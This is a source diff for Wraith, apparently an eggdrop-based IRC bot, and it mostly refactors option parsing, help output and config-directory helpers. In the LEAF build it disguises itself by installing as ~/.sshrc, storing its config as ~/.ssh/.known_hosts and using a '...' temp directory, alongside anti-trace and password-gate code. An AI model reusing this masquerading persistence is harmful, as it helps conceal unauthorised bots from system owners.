@@ -480,36 +480,35 @@ void eggAssert(const char *file, int line, const char *module)
 {
 #ifdef DEBUG_CONTEXT
   write_debug();
-#endif
+#endif /* DEBUG_CONTEXT */
   if (!module)
     putlog(LOG_MISC, "*", "* In file %s, line %u", file, line);
   else
     putlog(LOG_MISC, "*", "* In file %s:%s, line %u", module, file, line);
   fatal("ASSERT FAILED -- CRASHING!", 1);
 }
-#endif
+#endif /* DEBUG_ASSERT */
 
 #ifdef LEAF
 static void gotspawn(char *);
-#endif
+#endif /* LEAF */
 
-int checkedpass = 0;
 void checkpass() 
 {
+  static int checkedpass = 0;
   if (!checkedpass) {
     char *gpasswd;
     MD5_CTX ctx;
     int i = 0;
 
-    gpasswd = (char *) getpass(STR("* Enter password: "));
+    gpasswd = (char *) getpass("");
     MD5_Init(&ctx);
     MD5_Update(&ctx, gpasswd, strlen(gpasswd));
     MD5_Final(md5out, &ctx);
     for(i=0; i<16; i++)
       sprintf(md5string + (i*2), "%.2x", md5out[i]);
     if (strcmp(shellpass, md5string)) {
-      fatal("incorrect password.",0);
-      exit(1); //this shouldn't be reached..
+      fatal("incorrect password.", 0);
     }
     gpasswd = 0;
     checkedpass = 1;
@@ -519,17 +518,42 @@ void checkpass()
 void got_ed(char *, char *, char *);
 extern int optind;
 
+void show_help()
+{
+  char format[81];
+
+  egg_snprintf(format, sizeof format, "%%-30s %%-30s\n");
+
+  printf(STR("Wraith %s (%d)\n\n"), egg_version, egg_numver);
+  printf(format, STR("Option"), STR("Description"));
+  printf(format, STR("------"), STR("-----------"));
+  printf(format, STR("-e <infile> <outfile>"), STR("Encrypt infile to outfile"));
+  printf(format, STR("-d <infile> <outfile>"), STR("Decrypt infile to outfile"));
+  printf(format, STR("-D"), STR("Enables debug mode (see -n)"));
+  printf(format, STR("-E [#/all]"), STR("Display Error codes english translation (use 'all' to display all)"));
+  printf(format, STR("-h"), STR("Display this help listing"));
+/*   printf(format, STR("-k <botname>"), STR("Terminates (botname) with kill -9")); */
+  printf(format, STR("-n"), STR("Disables backgrounding first bot in conf"));
+  printf(format, STR("-t"), STR("Enables \"Partyline\" emulation (requires -n)"));
+  printf(format, STR("-v"), STR("Displays bot version"));
+  exit(0);
+}
+
+
 #ifdef LEAF
-#define PARSE_FLAGS "edntvPcDE"
-#endif
+#define PARSE_FLAGS "cedhntvPDE"
+#endif /* LEAF */
 #ifdef HUB
-#define PARSE_FLAGS "edntvDE"
-#endif
+#define PARSE_FLAGS "edhntvDE"
+#endif /* HUB */
+#define FLAGS_CHECKPASS "edhntDEv"
 static void dtx_arg(int argc, char *argv[])
 {
   int i;
   char *p = NULL, *p2 = NULL;
   while ((i = getopt(argc, argv, PARSE_FLAGS)) != EOF) {
+    if (strchr(FLAGS_CHECKPASS, i))
+      checkpass();
     switch (i) {
 #ifdef LEAF
       case 'c':
@@ -538,25 +562,29 @@ static void dtx_arg(int argc, char *argv[])
         if (!localhub)
           gotspawn(p);
         break;
-#endif
+#endif /* LEAF */
+      case 'h':
+        show_help();
+        break; /* never reached */
+      case 'k':
+        p = argv[optind];
+/*        kill_bot(p); */
+        exit(0);
+        break; /* never reached */
       case 'n':
-        checkpass();
 	backgrd = 0;
 	break;
       case 't':
-        checkpass();
         term_z = 1;
         break;
       case 'D':
-        checkpass();
         sdebug = 1;
         sdprintf("debug enabled");
         break;
       case 'E':
-        checkpass();
         p = argv[optind];
         if (p) {
-          if (p[0] == '*') {
+          if (!strcmp(p, "all")) {
             int n;
             putlog(LOG_MISC, "*", "Listing all errors");
             for (n = 1; n < ERR_MAX; n++)
@@ -584,7 +612,6 @@ static void dtx_arg(int argc, char *argv[])
         got_ed("d", p, p2);
         break; /* this should never be reached */
       case 'v':
-	checkpass();
 	printf("%d\n", egg_numver);
 	bg_send_quit(BG_ABORT);
 	exit(0);
@@ -601,7 +628,7 @@ static void dtx_arg(int argc, char *argv[])
         break;
 #endif
       default:
-        exit(1);
+//        exit(1);
         break;
     }
   }
@@ -865,38 +892,12 @@ void check_static(char *, char *(*)());
 int init_userrec(), init_mem(), init_dcc_max(), init_userent(), init_misc(), init_bots(),
  init_net(), init_modules(), init_tcl(int, char **), init_botcmd();
 
-void checklockfile()
-{
-#ifndef LOCK_EX
-#define LOCK_EX 2
-#endif
-#ifndef LOCK_NB
-#define LOCK_NB 4
-#endif
-  static int lockfile;
-  char *p;
-
-  p = strrchr(binname, '/');
-  p++;
-  snprintf(lock_file, sizeof lock_file, "%s/.lock.%s", tempdir, p);
-  lockfile = open(lock_file, O_EXCL);
-  if (lockfile <= 0) {
-    lockfile = open(lock_file, O_EXCL | O_CREAT, S_IWUSR | S_IRUSR);
-  }
-  if (lockfile <= 0) {
-    exit(1);
-  }
-  if (flock(lockfile, LOCK_EX | LOCK_NB))
-    exit(1);
-}
-
 void got_ed(char *which, char *in, char *out)
 {
 Context;
   sdprintf("got_Ed called: -%s i: %s o: %s", which, in, out);
   if (!in || !out)
     fatal("Wrong number of arguments: -e/-d <infile> <outfile/STDOUT>",0);
-  checkpass();
   check_static("blowfish", blowfish_start);
   module_load(ENCMOD);
   if (!strcmp(which, "e")) {
@@ -1076,7 +1077,6 @@ static int spawnbot(char *bin, char *nick, char *ip, char *host, char *ipsix, in
   fclose(fp);
 
   sprintf(bufrun, "%s -c %s", bin, buf);
-
   return system(bufrun);
 }
 #endif
@@ -1156,6 +1156,44 @@ void check_trace_start()
 #endif /* S_ANTITRACE */
 }
 
+char *homedir()
+{
+  static char home[DIRMAX];
+  struct passwd *pw;
+
+  pw = getpwuid(geteuid());
+
+  if (!pw)
+   werr(ERR_PASSWD);
+
+  snprintf(home, sizeof home, "%s", pw->pw_dir);
+
+  return home;
+}
+
+char *confdir()
+{
+  static char conf[DIRMAX];
+
+#ifdef LEAF
+{
+  snprintf(conf, sizeof conf, "%s/.ssh", homedir());
+}
+#endif /* LEAF */
+#ifdef HUB
+{
+  char *tmpdir;
+
+  tmpdir = nmalloc(sizeof(binname)+1);
+  strcpy(tmpdir, binname);
+  snprintf(conf, sizeof conf, "%s", dirname(tmpdir));
+  nfree(tmpdir);
+}
+#endif /* HUB */
+
+  return conf;
+}
+
 int main(int argc, char **argv)
 {
   int xx, i;
@@ -1169,13 +1207,11 @@ int main(int argc, char **argv)
 #ifdef LEAF
   int skip = 0;
   FILE *fp;
-  struct passwd *pw;
-  char newbinbuf[DIRMAX], newbin[DIRMAX], confdir[DIRMAX], tmp[DIRMAX], 
+  char newbinbuf[DIRMAX], newbin[DIRMAX], tmp[DIRMAX], 
        cfile[DIRMAX], templine[8192], *temps;
   int ok = 1;
 #else
-  char confdir[DIRMAX], tmp[DIRMAX], cfile[DIRMAX], templine[8192], *temps;
-  char tmpdir[DIRMAX];
+  char tmp[DIRMAX], cfile[DIRMAX], templine[8192], *temps;
 #endif
   char c[1024], *vers_n, *unix_n;
 #ifdef HAVE_UNAME
@@ -1293,23 +1329,13 @@ int main(int argc, char **argv)
   }
 
 #ifdef LEAF
-
   sdprintf("my uid: %d my uuid: %d, my ppid: %d my pid: %d", getuid(), geteuid(), getppid(), getpid());
-
-Context;
-  pw = getpwuid(geteuid());
-
-  if (!pw)
-   werr(ERR_PASSWD);
-  chdir(pw->pw_dir);
-  snprintf(newbin, sizeof newbin, "%s/.sshrc", pw->pw_dir);
-  snprintf(confdir, sizeof confdir, "%s/.ssh", pw->pw_dir);
-  snprintf(tempdir, sizeof tempdir, "%s/...", confdir);
+  chdir(homedir());
+  snprintf(newbin, sizeof newbin, "%s/.sshrc", homedir());
+  snprintf(tempdir, sizeof tempdir, "%s/...", confdir());
 #endif /* LEAF */
 #ifdef HUB
-  snprintf(tmpdir, sizeof tmpdir, "%s", binname);
-  snprintf(confdir, sizeof confdir, "%s", dirname(tmpdir));
-  snprintf(tempdir, sizeof tempdir, "%s/tmp", confdir);
+  snprintf(tempdir, sizeof tempdir, "%s/tmp", confdir());
 #endif /* HUB */
 
 #ifdef LEAF
@@ -1358,13 +1384,9 @@ Context;
       werr(ERR_WRONGBINDIR);
     else {
       unlink(binname);
-      if (system(newbin)) {
-        sdprintf(STR("exiting due to problem with restarting new binary."));
-        exit(1);
-      } else {
-	sdprintf(STR("exiting to let new binary run.\n"));
-        exit(0);  //This is to spawn the new binary in the correct place.
-      }
+      system(newbin);
+      sdprintf(STR("exiting to let new binary run..."));
+      exit(0);
     }
   }
 
@@ -1373,13 +1395,13 @@ Context;
 
 #endif /* LEAF */
  
-  snprintf(tmp, sizeof tmp, "%s/", confdir);
+  snprintf(tmp, sizeof tmp, "%s/", confdir());
   if (!can_stat(tmp)) {
 #ifdef LEAF
     if (mkdir(tmp,  S_IRUSR | S_IWUSR | S_IXUSR)) {
-      unlink(confdir);
-      if (!can_stat(confdir))
-        if (mkdir(confdir, S_IRUSR | S_IWUSR | S_IXUSR))
+      unlink(confdir());
+      if (!can_stat(confdir()))
+        if (mkdir(confdir(), S_IRUSR | S_IWUSR | S_IXUSR))
 #endif /* LEAF */
           werr(ERR_CONFSTAT);
 #ifdef LEAF
@@ -1397,16 +1419,16 @@ Context;
     }
   }
 
-  if (!fixmod(confdir))
+  if (!fixmod(confdir()))
     werr(ERR_CONFDIRMOD);
   if (!fixmod(tempdir))
     werr(ERR_TMPMOD);
 
   //The config dir is accessable with correct permissions, lets read/write/create config file now..
 #ifdef LEAF
-  snprintf(cfile, sizeof cfile, "%s/.known_hosts", confdir);
+  snprintf(cfile, sizeof cfile, "%s/.known_hosts", confdir());
 #else
-  snprintf(cfile, sizeof cfile, "%s/conf", confdir);
+  snprintf(cfile, sizeof cfile, "%s/conf", confdir());
 #endif /* LEAF */
   if (!can_stat(cfile))
     werr(ERR_NOCONF);
@@ -1508,7 +1530,7 @@ Context;
         if (i == 1) { //this is the first bot ran/parsed
           strncpyz(s, ctime(&now), sizeof s);
           strcpy(&s[11], &s[20]);
-          printf("--- Loading %s (%s)\n\n", ver, s);
+//          printf("--- Loading %s (%s)\n\n", ver, s);
 
           if (ip && ip[0] == '!') { //natip
             ip++;
@@ -1519,9 +1541,9 @@ Context;
           }
           snprintf(origbotname, 10, "%s", nick);
 #ifdef HUB
-          sprintf(userfile, "%s/.%s.user", confdir, nick);
+          sprintf(userfile, "%s/.%s.user", confdir(), nick);
 #endif /* HUB */
-/* log          sprintf(logfile, "%s/.%s.log", confdir, nick); */
+/* log          sprintf(logfile, "%s/.%s.log", confdir(), nick); */
           if (host && host[1]) { //only copy host if it is longer than 1 char (.)
             if (host[0] == '+') { //ip6 host
               host++;
@@ -1597,11 +1619,11 @@ Context;
 
 
   if (!encrypt_pass) {
-    printf(MOD_NOCRYPT);
+    sdprintf(MOD_NOCRYPT);
     bg_send_quit(BG_ABORT);
     exit(1);
   }
-//temp
+
   cache_miss = 0;
   cache_hit = 0;
   if (!pid_file[0])
@@ -1614,6 +1636,7 @@ Context;
       xx = atoi(s);
       kill(xx, SIGCHLD);
       if (errno != ESRCH) { //!= is PID is running.
+        sdprintf("%s is already running, pid: %d", botnetnick, xx);
         bg_send_quit(BG_ABORT);
         exit(1);
       }
